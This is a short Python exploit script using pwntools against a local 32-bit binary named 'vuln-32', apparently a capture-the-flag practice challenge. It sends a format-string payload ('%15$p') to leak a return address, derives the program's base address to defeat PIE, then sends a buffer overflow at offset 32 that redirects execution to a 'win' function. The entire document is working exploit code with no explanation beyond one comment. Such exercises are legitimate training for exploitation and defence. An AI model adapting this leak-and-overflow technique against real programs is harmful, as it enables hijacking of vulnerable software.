from pwn import *

exe='./vuln-32'

elf=context.binary=ELF(exe)

p=elf.process()

offset_eip=32
offset_printf=7

payload=b'%15$p' #i know that vuln ret to main, then ebp+4 contain the address of main, BOOM!!
p.recvline()
p.sendline(payload)
p.recvuntil(b'you')

ret_address=int(p.recvline(),16)

elf.address=(ret_address-elf.sym['main']) & 0xFFFFF000

info(hex(elf.address))


payload=flat({
    offset_eip:elf.sym['win']
})

p.sendline(payload)

log.success(p.clean())